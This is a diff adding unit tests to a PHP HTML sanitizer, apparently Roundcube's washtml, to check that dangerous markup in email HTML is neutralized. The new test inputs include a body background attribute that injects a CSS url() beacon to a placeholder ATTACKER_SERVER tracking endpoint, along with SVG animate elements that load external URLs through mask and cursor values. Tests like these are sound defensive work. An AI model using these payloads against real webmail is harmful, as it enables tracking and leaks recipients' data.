@@ -271,6 +271,13 @@ class WashtmlTest extends TestCase
         $this->assertMatchesRegularExpression('|link="#111"|', $washed, 'Body link attribute');
         $this->assertMatchesRegularExpression('|alink="#222"|', $washed, 'Body alink attribute');
         $this->assertMatchesRegularExpression('|vlink="#333"|', $washed, 'Body vlink attribute');
+
+        $html = '<html><body background="data:image/png,x);background:url(//ATTACKER_SERVER/track?uid=test"></body></html>';
+
+        $washer = new \rcube_washtml(['html_elements' => ['body']]);
+        $washed = $washer->wash($html);
+
+        $this->assertMatchesRegularExpression('|x-washed="background"|', $washed, 'Body evil background');
     }
 
     /**
@@ -516,6 +523,20 @@ class WashtmlTest extends TestCase
             [
                 '<html><svg><defs><filter><feImage xlink:href="http://external.site"/></filter></defs></html>',
                 '<svg><defs><filter><feimage x-washed="xlink:href"></feimage></filter></defs></svg>',
+            ],
+            [
+                '<svg><animate attributeName="mask" values="url(https://external.site)" fill="freeze" dur="0.1s" /></svg>',
+                '<svg><!-- animate blocked --></svg>',
+            ],
+            [
+                '<svg><animate attributeName="mask" values="none;url(https://external.site);url(https://external.site)"'
+                    . ' repeatCount="indefinite" dur="1s" /></svg>',
+                '<svg><!-- animate blocked --></svg>',
+            ],
+            [
+                '<svg><animate attributeName="cursor" attributeType="CSS" values="url(https://external.site),auto"'
+                    . ' feel="freeze" dur="1s" /></svg>',
+                '<svg><!-- animate blocked --></svg>',
             ],
         ];
     }
